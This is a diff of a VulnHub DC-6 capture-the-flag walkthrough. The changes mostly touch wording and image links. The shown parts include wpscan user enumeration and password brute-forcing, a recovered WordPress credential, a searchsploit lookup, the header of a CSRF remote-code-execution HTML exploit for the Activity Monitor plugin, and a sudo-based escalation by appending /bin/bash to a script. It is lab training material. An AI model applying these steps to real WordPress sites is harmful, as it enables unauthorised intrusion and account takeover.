@@ -1,11 +1,12 @@
-# VulnHub
-![Alt Tag]
+DC-6
+[+] Wordpress User Enumeration
+[+] Wordpress Brute Force
+[+] Activity Monitor  Wordpress Exporit (CSRF - Reverse Shell)
+[+] Privilege Escalation/Lateral Movement by abusing SUDO rights
 
-
-Discovery
+Discovery Phase
 
 Nmap Scan Results
-
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Nmap scan report for 192.168.56.103
@@ -40,14 +41,15 @@ root@setrus:~# cat /etc/hosts
 192.168.56.103	wordy
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-![Alt Tag] 
+Wordpress Login
+![Alt Tag] (https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p1.png)
 Wordpress Login
 
 The applicate is based on WordPress
 Enumerating users in WordpPress with WPScan
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/dc6# wpscan --url http://wordy --enumerate u
+root@setrus:~# wpscan --url http://wordy --enumerate u
 _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
@@ -167,8 +169,8 @@ The author left a clue
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/dc6# cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
-root@setrus:~/vulnhub/dc6# wpscan --url http://wordy --passwords passwords.txt -U mark
+root@setrus:~# cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
+root@setrus:~# wpscan --url http://wordy --passwords passwords.txt -U mark
 _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
@@ -264,15 +266,12 @@ Trying mark / henrik01 Time: 00:00:23 <===> (1875 / 1875) 100.00% Time: 00:00:23
 username  : mark
 password : hepdesk01
 
-Logging into wordpress
-
-We have access to wordpress as tom.
-Looking at activity monitory and searching for a exploit
-![Alt Tag] 
+We have access to wordpress as mark
+Looking at activity monitory and searching for a exploit.
+![Alt Tag] (https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p2.png)
 Activity Monitor
 
-
-Searching for expoit for activity Monitor
+Searching for expoit for Activity Monitor
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 root@setrus:~# searchsploit activity monitor
@@ -353,12 +352,10 @@ PoC:
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
-we create a reverse shell from activity Monitor
-Create a file in Kali Localhost 
+Creating a html file in attacker machine and adding it in /var/www/html
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:/var/www/html# cat crsf_wordpress.html 
+root@setrus:/var/www/html# cat csrf_wordpress.html 
 <html>
   <!--  Wordpress Plainview Activity Monitor RCE
         [+] Version: 20161228 and possibly prior
@@ -380,7 +377,7 @@ root@setrus:/var/www/html# cat crsf_wordpress.html
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-![Alt Tag] 
+![Alt Tag] (https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p3.png)
 
 
 
@@ -392,8 +389,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-
-Lateral Movement as user Graham  :
+Lateral movement as user Graham  :
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 www-data@dc-6:/home/mark/stuff$ ls
@@ -417,11 +413,7 @@ id
 uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-
-Privilege Escalation
-
+Getting user jens
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 graham@dc-6:~$ sudo -l
 sudo -l
@@ -435,7 +427,7 @@ User graham may run the following commands on dc-6:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-adding /bin/bash to the end of the ./backups.sh 
+We are adding /bin/bash to the end of the ./backups.sh 
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
